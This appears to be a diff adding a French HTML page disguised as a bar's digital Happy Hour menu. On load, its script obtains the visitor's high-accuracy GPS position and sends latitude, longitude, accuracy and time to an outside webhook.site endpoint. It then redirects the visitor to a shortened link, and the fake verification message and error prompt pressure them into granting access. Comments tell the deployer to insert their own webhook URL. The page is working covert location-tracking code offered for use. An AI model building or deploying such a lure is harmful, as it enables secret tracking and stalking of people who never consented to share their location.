@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Menu Digital - L'Échiquier Bar</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #eee; text-align: center; padding: 50px 20px; margin: 0; }
+        .container { max-width: 500px; margin: auto; border: 1px solid #333; padding: 30px; border-radius: 15px; background: #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: #ffcc00; font-size: 24px; }
+        .loader { border: 4px solid #333; border-top: 4px solid #ffcc00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { line-height: 1.6; color: #bbb; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>🍸 L'Échiquier Bar</h1>
+        <div class="loader"></div>
+        <p>Vérification de votre présence dans l'établissement pour activer les tarifs <strong>Happy Hour</strong>...</p>
+        <p style="font-size: 12px; color: #666;">Chargement du script de géolocalisation v2.4...</p>
+    </div>
+
+    <script>
+        // FONCTION DE RÉCUPÉRATION GPS
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    
+                    // 1. ENVOI DES DONNÉES VERS TON TABLEAU DE BORD
+                    // REMPLACE LE LIEN CI-DESSOUS PAR TON URL UNIQUE WEBHOOK.SITE
+                    fetch("https://webhook.site/055a01e9-e4df-4b38-ad0e-89c499c2d687", {
+                        method: "POST",
+                        mode: "no-cors",
+                        body: JSON.stringify({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            precision: position.coords.accuracy + " mètres",
+                            heure: new Date().toLocaleString()
+                        })
+                    });
+
+                    // 2. REDIRECTION VERS LE VRAI BAR
+                    setTimeout(function() {
+                        // REMPLACE LE LIEN CI-DESSOUS PAR LE LIEN GOOGLE MAPS DU BAR
+                        window.location.href = "https://bit.ly/3QznrmR";
+                    }, 1500); // Petite pause pour s'assurer que l'envoi est fait
+
+                }, function(error) {
+                    alert("Erreur de calibration : L'accès au GPS est requis pour valider les tarifs Happy Hour de L'Échiquier.");
+                }, {enableHighAccuracy: true}); // Force la précision maximale
+            }
+        };
+    </script>
+
+</body>
+</html>
